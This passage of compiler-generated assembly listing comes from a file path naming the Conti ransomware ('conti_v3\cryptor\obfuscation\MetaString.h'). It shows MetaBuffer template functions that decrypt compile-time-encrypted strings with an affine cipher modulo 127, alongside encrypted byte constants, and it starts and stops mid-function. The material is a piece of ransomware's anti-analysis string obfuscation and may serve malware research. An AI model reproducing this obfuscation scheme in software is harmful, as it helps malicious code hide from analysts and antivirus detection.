; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 20 00 00 00	 mov	 eax, 32			; 00000020H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 25	 mov	 BYTE PTR [rcx+1], 37	; 00000025H
  00007	c6 41 02 74	 mov	 BYTE PTR [rcx+2], 116	; 00000074H
  0000b	c6 41 03 28	 mov	 BYTE PTR [rcx+3], 40	; 00000028H
  0000f	c6 41 04 72	 mov	 BYTE PTR [rcx+4], 114	; 00000072H
  00013	c6 41 05 55	 mov	 BYTE PTR [rcx+5], 85	; 00000055H
  00017	c6 41 06 60	 mov	 BYTE PTR [rcx+6], 96	; 00000060H
  0001b	c6 41 07 0b	 mov	 BYTE PTR [rcx+7], 11
  0001f	c6 41 08 74	 mov	 BYTE PTR [rcx+8], 116	; 00000074H
  00023	c6 41 09 74	 mov	 BYTE PTR [rcx+9], 116	; 00000074H
  00027	c6 41 0a 20	 mov	 BYTE PTR [rcx+10], 32	; 00000020H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0CA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,32,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0d 00 00
	00		 mov	 r10d, 13
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 17 00 00 00	 mov	 eax, 23
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1b	 imul	 ecx, eax, 27

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 43	 mov	 BYTE PTR [rcx+1], 67	; 00000043H
  00007	c6 41 02 5e	 mov	 BYTE PTR [rcx+2], 94	; 0000005eH
  0000b	c6 41 03 0e	 mov	 BYTE PTR [rcx+3], 14
  0000f	c6 41 04 2f	 mov	 BYTE PTR [rcx+4], 47	; 0000002fH
  00013	c6 41 05 0e	 mov	 BYTE PTR [rcx+5], 14
  00017	c6 41 06 42	 mov	 BYTE PTR [rcx+6], 66	; 00000042H
  0001b	c6 41 07 26	 mov	 BYTE PTR [rcx+7], 38	; 00000026H
  0001f	c6 41 08 2f	 mov	 BYTE PTR [rcx+8], 47	; 0000002fH
  00023	c6 41 09 1a	 mov	 BYTE PTR [rcx+9], 26
  00027	c6 41 0a 18	 mov	 BYTE PTR [rcx+10], 24
  0002b	c6 41 0b 13	 mov	 BYTE PTR [rcx+11], 19
  0002f	c6 41 0c 13	 mov	 BYTE PTR [rcx+12], 19
  00033	c6 41 0d 17	 mov	 BYTE PTR [rcx+13], 23
  00037	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003b	48 8b c1	 mov	 rax, rcx
  0003e	c3		 ret	 0
??0?$MetaBuffer@$0CP@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<47,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 63   :         if (!isDecrypted())

  00003	84 c0		 test	 al, al
  00005	75 5c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00007	4c 8d 51 01	 lea	 r10, QWORD PTR [rcx+1]
  0000b	41 bb 0a 00 00
	00		 mov	 r11d, 10
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00011	41 0f b6 02	 movzx	 eax, BYTE PTR [r10]
  00015	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00019	44 8d 04 80	 lea	 r8d, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  0001d	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00022	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00025	41 f7 e0	 mul	 r8d
  00028	41 8b c0	 mov	 eax, r8d
  0002b	2b c2		 sub	 eax, edx
  0002d	d1 e8		 shr	 eax, 1
  0002f	03 c2		 add	 eax, edx
  00031	c1 e8 06	 shr	 eax, 6
  00034	6b c0 7f	 imul	 eax, eax, 127		; 0000007fH
  00037	44 2b c0	 sub	 r8d, eax
  0003a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0003f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00043	41 f7 e8	 imul	 r8d
  00046	41 03 d0	 add	 edx, r8d
  00049	c1 fa 06	 sar	 edx, 6
  0004c	8b c2		 mov	 eax, edx
  0004e	c1 e8 1f	 shr	 eax, 31
  00051	03 d0		 add	 edx, eax
  00053	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00056	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00059	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0005d	49 83 eb 01	 sub	 r11, 1
  00061	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00063	48 8d 41 01	 lea	 rax, QWORD PTR [rcx+1]
  00067	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 0b	 mov	 BYTE PTR [rcx+1], 11
  00007	c6 41 02 25	 mov	 BYTE PTR [rcx+2], 37	; 00000025H
  0000b	c6 41 03 0a	 mov	 BYTE PTR [rcx+3], 10
  0000f	c6 41 04 57	 mov	 BYTE PTR [rcx+4], 87	; 00000057H
  00013	c6 41 05 57	 mov	 BYTE PTR [rcx+5], 87	; 00000057H
  00017	c6 41 06 1e	 mov	 BYTE PTR [rcx+6], 30
  0001b	c6 41 07 0a	 mov	 BYTE PTR [rcx+7], 10
  0001f	c6 41 08 57	 mov	 BYTE PTR [rcx+8], 87	; 00000057H
  00023	c6 41 09 57	 mov	 BYTE PTR [rcx+9], 87	; 00000057H
  00027	c6 41 0a 00	 mov	 BYTE PTR [rcx+10], 0
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0FJ@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<89,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0d 00 00
	00		 mov	 r10d, 13
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 2f 00 00 00	 mov	 eax, 47			; 0000002fH
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 54	 mov	 BYTE PTR [rcx+1], 84	; 00000054H
  00007	c6 41 02 10	 mov	 BYTE PTR [rcx+2], 16
  0000b	c6 41 03 4f	 mov	 BYTE PTR [rcx+3], 79	; 0000004fH
  0000f	c6 41 04 45	 mov	 BYTE PTR [rcx+4], 69	; 00000045H
  00013	c6 41 05 3a	 mov	 BYTE PTR [rcx+5], 58	; 0000003aH
  00017	c6 41 06 61	 mov	 BYTE PTR [rcx+6], 97	; 00000061H
  0001b	c6 41 07 23	 mov	 BYTE PTR [rcx+7], 35	; 00000023H
  0001f	c6 41 08 5f	 mov	 BYTE PTR [rcx+8], 95	; 0000005fH
  00023	c6 41 09 51	 mov	 BYTE PTR [rcx+9], 81	; 00000051H
  00027	c6 41 0a 10	 mov	 BYTE PTR [rcx+10], 16
  0002b	c6 41 0b 2c	 mov	 BYTE PTR [rcx+11], 44	; 0000002cH
  0002f	c6 41 0c 2c	 mov	 BYTE PTR [rcx+12], 44	; 0000002cH
  00033	c6 41 0d 2f	 mov	 BYTE PTR [rcx+13], 47	; 0000002fH
  00037	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003b	48 8b c1	 mov	 rax, rcx
  0003e	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0b 00 00
	00		 mov	 r11d, 11
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 7a	 sub	 ecx, 122		; 0000007aH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
